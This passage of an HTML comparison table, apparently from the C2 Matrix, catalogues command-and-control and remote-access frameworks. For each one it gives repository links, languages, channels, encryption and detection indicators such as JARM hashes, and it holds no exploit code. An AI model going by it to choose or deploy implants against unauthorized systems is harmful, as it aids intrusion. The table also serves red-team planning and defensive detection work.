href="http://install.sh/">install.sh</a></td><td></td><td></td><td></td><td>Python</td><td>JScript&#x2F;VBScript</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>NA</td><td>4</td><td></td></tr><tr><td>Pupy</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a></td><td></td><td>@n1nj4sec</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Python</td><td>Python</td><td>No</td><td>CLI</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>596</td><td></td></tr><tr><td>QuasarRAT</td><td>MIT</td><td>NA</td><td><a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a></td><td></td><td></td><td>@leekirkpatrick4</td><td>5&#x2F;20&#x2F;2020</td><td>1.3.0.0</td><td>C#</td><td></td><td></td><td></td><td>C#</td><td>C#</td><td>No</td><td>GUI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>TLS</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td><a href="https://attack.mitre.org/software/S0262/">Yes</a></td><td>Yes</td><td>No</td><td></td><td></td><td></td><td><a href="https://community.rsa.com/community/products/netwitness/blog/2020/05/26/using-rsa-netwitness-to-detect-quasarrat">Yes</a></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>529</td><td></td></tr><tr><td>RATel</td><td>MIT</td><td>NA</td><td><a href="https://github.com/FrenchCisco/RATel">https://github.com/FrenchCisco/RATel</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Realm</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/spellshift/realm">https://github.com/spellshift/realm</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>REC2</td><td>MIT</td><td>NA</td><td><a href="https://github.com/g0h4n/REC2">https://github.com/g0h4n/REC2</a></td><td></td><td>@g0h4n_0</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Red Team Toolkit</td><td>Commercial</td><td>$7,000</td><td></td><td><a href="https://www.netspi.com/technology/red-team-toolkit/">https://www.netspi.com/technology/red-team-toolkit/</a></td><td>@SilentBreakSec</td><td>@dmay3r</td><td>11&#x2F;22&#x2F;2019</td><td>2.63</td><td><a href="http://install.sh/">install.sh</a></td><td></td><td></td><td></td><td>Python</td><td>C++</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>NA</td><td></td></tr><tr><td>RedbloodC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/kira2040k/RedbloodC2">https://github.com/kira2040k/RedbloodC2</a></td><td></td><td>@kira_321k</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>RedditC2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/kleiton0x00/RedditC2">https://github.com/kleiton0x00/RedditC2</a></td><td></td><td>@kleiton0x7e @t4tch3r_</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>RedHerd Framework</td><td>MIT</td><td>NA</td><td><a href="https://github.com/redherd-project/redherd-framework">https://github.com/redherd-project/redherd-framework</a></td><td><a href="https://redherd.readthedocs.io/">https://redherd.readthedocs.io</a></td><td>@RedHerdProject</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td>9&#x2F;29&#x2F;2021</td><td>0.0.4</td><td>JavaScript &#x2F; Docker</td><td></td><td></td><td></td><td>Node.js</td><td>NA</td><td>Yes</td><td>Web</td><td>Yes</td><td>Yes</td><td>Yes*</td><td>Yes*</td><td>Yes*</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes (SSH)</td><td>NA</td><td>NA</td><td>NA</td><td>NA</td><td>NA</td><td>NA</td><td>NA</td><td>NA</td><td>No</td><td></td><td>Yes**</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td></td><td>(*) Implant refers to the supported OS for the assets. (**) ATT&amp;CK Mapping is easly integrated through custom topics, the default is CKC Mapping.</td></tr><tr><td>redViper</td><td>NA</td><td>NA</td><td><a href="https://github.com/itsKindred/redViper">https://github.com/itsKindred/redViper</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>0</td><td></td></tr><tr><td>ReVBShell</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/bitsadmin/revbshell">https://github.com/bitsadmin/revbshell</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ReverseTCPShell</td><td>NA</td><td>NA</td><td><a href="https://github.com/ZHacker13/ReverseTCPShell">https://github.com/ZHacker13/ReverseTCPShell</a></td><td></td><td>@ZHacker13</td><td>@jorgeorchilles</td><td>12&#x2F;19&#x2F;2019</td><td>NA</td><td>PowerShell</td><td></td><td></td><td></td><td>PowerShell</td><td>PowerShell</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>No</td><td>No</td><td>NA</td><td>0</td><td>Direct, constant TCP connection</td></tr><tr><td>sak1to-shell</td><td>NA</td><td>NA</td><td><a href="https://github.com/d4rk007/sak1to-shell">https://github.com/d4rk007/sak1to-shell</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Sandman</td><td>NA</td><td>NA</td><td><a href="https://github.com/Idov31/Sandman">https://github.com/Idov31/Sandman</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>SCYTHE</td><td>Commercial</td><td>Contact Sales</td><td><a href="https://github.com/scythe-io">https://github.com/scythe-io</a></td><td><a href="https://scythe.io/">https://scythe.io</a></td><td>@scythe_io</td><td>@Adam_Mashinchi</td><td>7&#x2F;7&#x2F;2020</td><td>3</td><td>Binary</td><td></td><td></td><td></td><td>Python</td><td>C</td><td>Yes</td><td>Web</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td>Curve25519</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td></td><td></td><td>2ad2ad16d2ad2ad22c42d42d0000006f254909a73bf62f6b28507e9fb451b5</td><td></td><td>Yes</td><td>No</td><td>NA</td><td>NA</td><td></td></tr><tr><td>Secret Handshake</td><td>MIT</td><td>NA</td><td><a href="https://github.com/jconwell/secret_handshake">https://github.com/jconwell/secret_handshake</a></td><td></td><td>@turboCodr</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Serpentine</td><td>MIT</td><td>NA</td><td><a href="https://github.com/jafarlihi/serpentine">https://github.com/jafarlihi/serpentine</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Shad0w</td><td>MIT</td><td>NA</td><td><a href="https://github.com/bats3c/shad0w">https://github.com/bats3c/shad0w</a></td><td></td><td>@<em>batsec</em></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td></tr><tr><td>Shadow Workers</td><td>MIT</td><td>NA</td><td><a href="https://github.com/shadow-workers/shadow-workers">https://github.com/shadow-workers/shadow-workers</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ShadowForgeC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/0xEr3bus/ShadowForgeC2">https://github.com/0xEr3bus/ShadowForgeC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>SharpC2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/rasta-mouse/SharpC2">https://github.com/rasta-mouse/SharpC2</a></td><td><a href="https://rastamouse.me/2020/05/sharpc2/">https://rastamouse.me/2020/05/sharpc2/</a></td><td>@_RastaMouse @<em>xpn</em></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>SharpGmailC2</td><td>MIT</td><td>NA</td><td><a href="https://github.com/reveng007/SharpGmailC2">https://github.com/reveng007/SharpGmailC2</a></td><td></td><td>@reveng007</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>SilentTrinity</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/byt3bl33d3r/SILENTTRINITY">https://github.com/byt3bl33d3r/SILENTTRINITY</a></td><td></td><td>@byt3bl33d3r</td><td>@0sm0s1z</td><td>11&#x2F;13&#x2F;2019</td><td>0.4.6dev</td><td>Binary</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Python</td><td>Boolang</td><td>Yes</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>ECDHE</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>#silenttrinity bloodhoundhq.slack.com</td><td>489</td><td>67</td><td></td></tr><tr><td>SK8PARK&#x2F;RAT</td><td>NA</td><td>NA</td><td><a href="https://github.com/slyd0g/">https://github.com/slyd0g/</a></td><td></td><td>@slyd0g</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td>Python</td><td>C++</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>No</td><td>NA</td><td>0</td><td>SK8PARK is server and SK8RAT is implant</td></tr><tr><td>Slack-C2Bot</td><td>NA</td><td>NA</td><td><a href="https://github.com/praetorian-inc/slack-c2bot">https://github.com/praetorian-inc/slack-c2bot</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td><a href="https://github.com/nasbench/C2-Matrix-Indicators/tree/main/slack-c2bot">Yes</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Slack</td></tr><tr><td>Slackor</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/n00py/Slackor">https://github.com/n00py/Slackor</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td></tr><tr><td>Sliver</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a></td><td></td><td>@LittleJoeTables @rkervell @bishopfox</td><td>@jorgeorchilles</td><td>11&#x2F;5&#x2F;2019</td><td>0.0.6</td><td>Binary</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Go</td><td>Go</td><td>Yes</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>mTLS</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td><a href="https://www.proofpoint.com/us/blog/security-briefs/ta551-uses-sliver-red-team-tool-new-activity">Yes</a></td><td></td><td>No</td><td>Yes</td><td></td><td>Yes</td><td></td><td></td><td>2ad2ad0002ad2ad00041d2ad2ad41da5207249a18099be84ef3c8811adc883</td><td><a href="https://www.shodan.io/search?query=ssl.jarm:3fd21b20d00000021c43d21b21b43d41226dd5dfc615dd4a96265559485910+%22HTTP/1.1+404+Not+Found%22+%22Cache-Control:+no-store,+no-cache,+must-revalidate%22+%22Content-Length:+0%22&page=3">Yes</a></td><td>Yes</td><td>No</td><td>NA</td><td>131</td><td>Good for evasion</td></tr><tr><td>SQLC2</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/NetSPI/SQLC2">https://github.com/NetSPI/SQLC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Striker</td><td>NA</td><td>NA</td><td><a href="https://github.com/4g3nt47/Striker">https://github.com/4g3nt47/Striker</a></td><td></td><td>@UmarAbdoul</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>SuperShell</td><td>MIT</td><td>NA</td><td><a href="https://github.com/tdragon6/Supershell/">https://github.com/tdragon6/Supershell/</a></td><td><a href="https://github.com/tdragon6/Supershell/blob/main/README_EN.md">https://github.com/tdragon6/Supershell/blob/main/README_EN.md</a></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Throwback</td><td>GNU GPL2</td><td>NA</td><td><a href="https://github.com/silentbreaksec/Throwback">https://github.com/silentbreaksec/Throwback</a></td><td></td><td>@SilentBreakSec</td><td>@malcomvetter</td><td>2&#x2F;24&#x2F;2020</td><td>Aug 2017</td><td>shell script</td><td>Yes</td><td></td><td></td><td>php</td><td>C++</td><td>Yes</td><td>Web</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>RC4</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>No</td><td>No</td><td>NA</td><td>1</td><td>No updates in 5 years; web UI not authenticated</td></tr><tr><td>ThunderShell</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Mr-Un1k0d3r/ThunderShell">https://github.com/Mr-Un1k0d3r/ThunderShell</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ToRat</td><td>Unlicense</td><td>NA</td><td><a href="https://github.com/lu4p/ToRat">https://github.com/lu4p/ToRat</a></td><td></td><td><a href="https://twitter.com/lu4p3">@lu4p3</a></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Trevor</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/trustedsec/trevorc2/">https://github.com/trustedsec/trevorc2/</a></td><td></td><td>@HackingDave</td><td>@cabbagesalad2</td><td>10&#x2F;16&#x2F;2019</td><td>1.1</td><td>pip3</td><td>Yes</td><td></td><td></td><td>Python</td><td>Python&#x2F;PowerShell</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td><a href="https://nasbench.medium.com/understanding-detecting-c2-frameworks-trevorc2-2a9ce6f1f425">Yes</a></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>5</td><td></td></tr><tr><td>TripleCross</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/h3xduck/TripleCross">https://github.com/h3xduck/TripleCross</a></td><td></td><td>@h3xduck</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Twittor</td><td>MIT</td><td>NA</td><td><a href="https://github.com/PaulSec/twittor">https://github.com/PaulSec/twittor</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td>Twitter</td></tr><tr><td>Villain</td><td>Created Commons</td><td>NA</td><td><a href="https://github.com/t3l3machus/Villain">https://github.com/t3l3machus/Villain</a></td><td></td><td>@t3l3machus</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Violent Fungus</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/sogonsec/ViolentFungus-C2">https://github.com/sogonsec/ViolentFungus-C2</a></td><td></td><td></td><td><a 